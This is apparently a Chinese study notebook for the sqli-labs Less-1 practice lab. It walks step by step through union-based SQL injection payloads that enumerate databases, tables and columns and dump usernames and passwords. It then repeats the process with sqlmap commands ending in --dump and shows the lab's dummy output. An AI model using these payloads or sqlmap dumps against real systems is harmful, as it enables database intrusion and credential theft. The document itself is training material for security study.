---
title: lees1
url: https://www.yuque.com/u29002979/ep2zrx/zvrm2pp66n7s6xn5
---

<a name="z3aMA"></a>

# 1.判断有无注入点

    $sql="SELECT * FROM users WHERE id='1' LIMIT 0,1";

单引号闭合

`?id=1'`

> select * from users where id='1'' limit 0,1

有报错说明有注入点

<a name="lh1Tf"></a>

# 2.猜解列名数量

<a name="JHoY5"></a>

## `order by`

> %20表示为空格

`?id=1' order by 3 --+`
`?id=1' order by 4 --+`

> select * from users where id='1' order by 3 --+' limit 0,1

字段 3个 <a name="sFNaN"></a>

# 3.报错，判断回显点

<a name="XqT1O"></a>

## union

`?id=-1' union select 1,2,3 --+`

> select * from users where id='-1' union select 1,2,3 --+' limit 0,1

2,3是回显点 <a name="qHO7j"></a>

# 4.信息收集

> database(): 数据库名称
> version():数据库版本

`?id=-1' union select 1,database(),version()--+ `

> select * from users where id='-1' union select 1,database(),version()--+' limit 0,1

> **Your Login name:security**
> **Your Password:5.7.26**

数据库名称：**securit**
数据库版本：**5.7.26** <a name="xvLPE"></a>

# 5.使用对应SQL进行注入

> group\_concat()函数可以让多个数据在一行显示

<a name="EVRXH"></a>

## 查看所有数据库名称

`?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+`

> select * from users where id='-1' union select 1,2,group\_concat(schema\_name) from information\_schema.schemata--+' limit 0,1

> Your Login name:2
> Your Password:**information\_schema,challenges,dvwa\_com,mysql,performance\_schema,security,sql,sys**

> **存在的数据库：**
> **information\_schema**
> **challenges**
> **dvwa\_com**
> **performance\_schema**
> **security**
> **sql**
> **sys**

<a name="eGmlZ"></a>

## 查看使用数据表名称

`?id=-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+  `

> select * from users where id='-1' union select 1,2,group\_concat(table\_name) from information\_schema.tables where table\_schema=database()--+' limit 0,1

> Your Login name:2
> Your Password:**emails,referers,uagents,users**

> **表名**
> **emails**
> **referers**
> **uagents**
> **users**

<a name="MZSNh"></a>

## 查看字段名

`?id=-1' union select 1,2,group_concat(column_name) from information_shema.columns where table_name='users'--+`

> select * from users where id='-1' union select 1,2,group\_concat(column\_name) from information\_shema.columns where table\_name='users'--+' limit 0,1

> Your Login name:2
> Your Password:**user\_id,first\_name,last\_name,user,password,avatar,last\_login,failed\_login,USER,CURRENT\_CONNECTIONS,TOTAL\_CONNECTIONS,id,username,password**

> users的字段名
> **user\_id**
> **first\_name**
> **last\_name**
> **user**
> **password**
> **avatar**
> **last\_login**
> **failed\_login**
> **USER**
> **CURRENT\_CONNECTIONS**
> **TOTAL\_CONNECTIONS**
> **id**
> **username**
> **password**

<a name="nJvzj"></a>

## 查看字段

`id=-1' union select 1,2,(select group_concat(username,~,password)from users)--+`

> select * from users where id='`-1' union select 1,2,(select group_concat(username,0x7e,password)from users)--+`' limit 0,1

0x7e:~

> Your Login name:2
> Your Password:**Dumb~Dumb,Angelina~I-kill-you,Dummy~p@ssword,secure~crappy,stupid~stupidity,superman~genious,batman~mob!le,admin~admin,admin1~admin1,admin2~admin2,admin3~admin3,dhakkan~dumbo,admin4~admin4**

> 用户~口令:
> **Dumb~Dumb**
> **Angelina~I-kill-you**
> **Dummy~p@ssword**
> **secure~crappy**
> **stupid~stupidity**
> **superman~genious**
> **batman~mob!le**
> **admin~admin**
> **admin1~admin1**
> **admin2~admin2**
> **admin3~admin3**
> **dhakkan~dumbo**
> **admin4~admin4**

<br />
<a name="KKJFS"></a>
# sqlmap
`sqlmap -u http://192.168.31.193/Less-1/?id=1 --batch`
> **--batch:跳过询问,代表全自动 不用我们手动输入y/n**
> **-u:ip地址**

    ┌──(root㉿guoyx)-[/home/kali]
    └─# sqlmap -u http://192.168.31.193/Less-1/?id=1 --batch
    
    [22:05:28] [INFO] the back-end DBMS is MySQL
    web application technology: PHP 5.3.29, Apache 2.4.39
    back-end DBMS: MySQL >= 5.6

PHP 5.3.29,
&#x20;Apache 2.4.39
back-end DBMS: MySQL >= 5.6 <a name="ZKiKa"></a>

## 查看当前数据库名称

`sqlmap -u http://192.168.31.193/Less-1/?id=1 --batch --current-db`

> \--current-db:查看数据库名称

    ┌──(root㉿guoyx)-[/home/kali]
    └─# sqlmap -u http://192.168.31.193/Less-1/?id=1 --batch --current-db
    
    [22:11:23] [INFO] the back-end DBMS is MySQL
    web application technology: Apache 2.4.39, PHP 5.3.29
    back-end DBMS: MySQL >= 5.6
    [22:11:23] [INFO] fetching current database
    current database: 'security'
    [22:11:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.31.193'

security <a name="tOsVp"></a>

## 查看数据表名称

`sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" --tables`

> \-D  ：指定数据库名称
> \--tables：查看数据表

```
sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" --tables

Database: security
[4 tables]
+----------+
| emails   |
| referers |
| uagents  |
| users    |
+----------+

```

emails
referers
uagents
users <a name="rLD4A"></a>

## 查看字段名

`sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" -T "users" --columns`

> \-T "users" ：指定表名称
> \--columns：查看字段名

```
┌──(root㉿guoyx)-[/home/kali]
└─# sqlmap -u 192.168.31.193/Less-1/?id=1 -D security -T users --columns

[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(3)      |
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+

```

id
password
username <a name="dvpUW"></a>

## 查看字段

`sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" -T "users" -C id,password,username --dump`

> \-C id,password,username：指定要显示的列
> \--dump脱裤

```bash
┌──(root㉿guoyx)-[/home/kali]
└─# sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" -T "users" -C id,password,username --dump

[13 entries]
+----+------------+----------+
| id | password   | username |
+----+------------+----------+
| 1  | Dumb       | Dumb     |
| 2  | I-kill-you | Angelina |
| 3  | p@ssword   | Dummy    |
| 4  | crappy     | secure   |
| 5  | stupidity  | stupid   |
| 6  | genious    | superman |
| 7  | mob!le     | batman   |
| 8  | admin      | admin    |
| 9  | admin1     | admin1   |
| 10 | admin2     | admin2   |
| 11 | admin3     | admin3   |
| 12 | dumbo      | dhakkan  |
| 14 | admin4     | admin4   |
+----+------------+----------+
```
